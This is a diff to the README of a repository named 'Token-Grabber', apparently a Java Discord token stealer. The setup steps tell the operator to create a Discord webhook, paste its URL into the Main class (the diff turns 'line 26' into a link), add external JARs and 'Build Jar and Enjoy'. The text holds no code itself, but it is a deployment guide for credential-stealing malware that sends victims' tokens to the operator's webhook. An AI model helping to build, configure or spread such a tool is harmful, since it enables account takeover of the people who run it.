@@ -10,7 +10,7 @@
 2. Server Settings > Webhooks
 3. Create Webhook
     * Name and Icon Doesn't matter as it will be changed when program is ran.
-4. Open Main Class Go to line 26 and put your Webhook URL there.
+4. Open Main Class Go to [line 26](https://github.com/RustyBalboadev/Token-Grabber/blob/master/TokenGrabber/src/Main.java#L24) and put your Webhook URL there.
 5. Add external JARs to the program [here](https://github.com/RustyBalboadev/Token-Grabber/tree/master/TokenGrabber/External%20JARS)
 5. Build Jar and Enjoy
 # Inspiration 🧠
